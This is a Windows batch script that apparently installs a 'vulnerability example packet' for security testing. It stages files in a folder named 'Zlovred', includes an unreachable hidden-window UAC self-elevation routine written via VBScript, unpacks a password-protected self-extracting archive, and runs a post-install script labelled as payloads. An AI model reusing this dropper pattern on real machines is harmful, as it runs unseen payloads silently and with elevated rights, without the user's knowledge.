@echo off
rem *******************************************************
rem install-mainexample.silent.cmd
rem This Script will Install a NIT
rem Vulnerability Example Packet for Local Computer
rem *******************************************************
@echo off

rem Set Metadata

set PRODUCT_TEMPNAME=mainexample.7
set PRODUCT_NAME=mainexample

rem Set Variables

rem Set a Variable
rem

setlocal EnableExtensions DisableDelayedExpansion

set "Reg32=%SystemRoot%\System32\reg.exe"
if not "%ProgramFiles(x86)%" == "" set "Reg32=%SystemRoot%\SysWOW64\reg.exe"

set "DownloadShellFolder="
for /F "skip=1 tokens=1,2*" %%T in ('%Reg32% query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "{374DE290-123F-4565-9164-39C4925E467B}" 2^>nul') do (
    if /I "%%T" == "{374DE290-123F-4565-9164-39C4925E467B}" (
        set "DownloadShellFolder=%%V"
        goto GetDownloadDirectory
    )
)

:GetDownloadDirectory
set "DownloadDirectory="
for /F "skip=1 tokens=1,2,3*" %%S in ('%Reg32% query "HKCU\Software\Microsoft\Internet Explorer" /v "Download Directory" 2^>nul') do (
    if /I "%%S" == "Download" (
        if /I "%%T" == "Directory" (
            set "DownloadDirectory=%%V"
            goto GetSaveDirectory
        )
    )
)

:GetSaveDirectory
set "SaveDirectory="
for /F "skip=1 tokens=1,2,3*" %%S in ('%Reg32% query "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Save Directory" 2^>nul') do (
    if /I "%%S" == "Save" (
        if /I "%%T" == "Directory" (
            set "SaveDirectory=%%V"
            goto EndDownloadResults
        )
    )
)

:EndDownloadResults

rem Get a Downloads Directory
rem
if not defined DownloadShellFolder echo DownloadShellFolder is not Defined  && exit /b 1
SET DownloadsPath=%DownloadShellFolder%

rem set TPDL variable
rem
if exist "C:\pub1\Distrib\Zlovred" set TPDL=C:\pub1\Distrib\Zlovred&& goto TPDL_End
set TPDL=%TEMP%
:TPDL_End

rem Set a Directory
rem

set INSTALLSCRIPT=postinstall.run.cmd

rem Set Files...
rem
set pathCMD=%SystemRoot%\System32
set WorkingDir=%~dp0

set NOTEPADEXE=%SystemRoot%\notepad.exe
set REGEXE=%pathCMD%\reg.exe
set CMDFILE001=%TEMP%\%PRODUCT_TEMPNAME%\%INSTALLSCRIPT%
set WMICEXE=%SystemRoot%\System32\wbem\WMIC.exe
set WSCRIPTEXE=%SystemRoot%\System32\wscript.exe
set MSIEXECEXE=%SystemRoot%\System32\msiexec.exe

rem First Check Integrity...
rem
if not exist %NOTEPADEXE% echo %NOTEPADEXE% is not found && exit /b 1
if not exist %REGEXE% echo %REGEXE% is not found && exit /b 1

rem echo Check System Integrity...
rem
if not exist %WMICEXE% echo %WMICEXE% is not found && exit /b 1
if not exist %WSCRIPTEXE% echo %WSCRIPTEXE% is not found && exit /b 1
if not exist %MSIEXECEXE% echo %MSIEXECEXE% is not found && exit /b 1

rem
rem echo Download and Run Payloads...
rem
title Installing Packages
::-------------------------------------
REM  --> CheckING for permissions
net session >nul 2>&1

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
rem Lock Data
exit /b 17
rem
set getadminvbs=nit-%~n0.vbs
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TPDL%\%getadminvbs%"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 0 >> "%TPDL%\%getadminvbs%"

    %wscriptexe% "%TPDL%\%getadminvbs%"
    del "%TPDL%\%getadminvbs%"
    exit /B 0

:gotAdmin
echo Run as Admin...

set SFXARCH=%PRODUCT_NAME%.exe
set PASS=brexit
set FOLDER=%~dp0
if not exist "%FOLDER%\%SFXARCH%" goto Error
"%FOLDER%\%SFXARCH%" -p%PASS%
goto Finish
:Error
echo "File %FOLDER%\%SFXARCH% not found" && exit /b 1
rem pause
:Finish

rem echo Check Integrity...
rem
if not exist %CMDFILE001% echo %CMDFILE001% is not found && exit /b 1

rem Download and Execute Payloads
rem

rem echo Run Payloads...

call %CMDFILE001%

cd /d %CURDIR%

rem echo The End of the script %0
exit /b 0